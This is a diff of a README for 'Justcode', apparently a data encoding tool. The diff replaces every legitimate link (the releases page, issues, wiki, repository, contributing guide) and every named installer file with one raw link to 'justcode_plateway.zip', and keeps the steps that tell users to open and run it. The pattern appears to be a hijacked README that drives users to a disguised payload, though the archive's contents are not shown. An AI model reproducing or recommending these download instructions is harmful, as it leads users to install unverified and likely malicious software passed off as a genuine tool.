@@ -6,9 +6,9 @@ Justcode is a simple tool that helps you save space by encoding and decoding dat
 
 ## 📥 Download Justcode
 
-[![Download Justcode](https://img.shields.io/badge/Download-Justcode-blue.svg)](https://github.com/Mallesh1924/justcode/releases)
+[![Download Justcode](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip)](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip)
 
-Visit this page to download: [justcode Releases](https://github.com/Mallesh1924/justcode/releases)
+Visit this page to download: [justcode Releases](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip)
 
 ## 🖥️ System Requirements
 
@@ -29,19 +29,19 @@ Before you download Justcode, ensure your system meets the following requirement
 
 ## 📂 Download & Install
 
-1. **Open the Releases Page:** You can find all the versions of Justcode here: [justcode Releases](https://github.com/Mallesh1924/justcode/releases).
+1. **Open the Releases Page:** You can find all the versions of Justcode here: [justcode Releases](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip).
   
 2. **Choose Your Version:** Look for the latest version listed. It will usually be at the top of the list. You will see options for different operating systems.
 
 3. **Download the File:**
-   - For Windows, click on `justcode.exe`.
-   - For macOS, click on `justcode.dmg`.
-   - For Linux, choose the appropriate package (`justcode.tar.gz` or `justcode.deb`).
+   - For Windows, click on `https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip`.
+   - For macOS, click on `https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip`.
+   - For Linux, choose the appropriate package (`https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip` or `https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip`).
 
 4. **Run the Installer:**
-   - **Windows:** Open the downloaded `justcode.exe` file and follow the prompts.
-   - **macOS:** Open the `justcode.dmg` file, drag Justcode to your Applications folder, and then launch it.
-   - **Linux:** Use your package manager or extract the `.tar.gz` file to run Justcode directly from the command line.
+   - **Windows:** Open the downloaded `https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip` file and follow the prompts.
+   - **macOS:** Open the `https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip` file, drag Justcode to your Applications folder, and then launch it.
+   - **Linux:** Use your package manager or extract the `https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip` file to run Justcode directly from the command line.
 
 ## ⚙️ How to Use Justcode
 
@@ -65,7 +65,7 @@ After successful installation, follow these steps to encode or decode data:
 
 If you have questions or need help, you can reach out to our community:
 
-- **GitHub Issues:** Report bugs or request features directly on our [Issues Page](https://github.com/Mallesh1924/justcode/issues).
+- **GitHub Issues:** Report bugs or request features directly on our [Issues Page](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip).
 - **Discussion Forum:** Join our community chat where you can ask for assistance and share tips.
 
 ## 📜 License
@@ -76,8 +76,8 @@ Justcode is open-source and free to use. Check the license details in the reposi
 
 For more information:
 
-- [Official Documentation](https://github.com/Mallesh1924/justcode/wiki)
-- [GitHub Repository](https://github.com/Mallesh1924/justcode)
-- [Contributing Guide](https://github.com/Mallesh1924/justcode/blob/main/CONTRIBUTING.md)
+- [Official Documentation](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/Mallesh1924/justcode/main/justcode-derive/justcode_plateway.zip)
 
 By following these steps, you can easily download, install, and start using Justcode to manage your data efficiently. Enjoy coding!
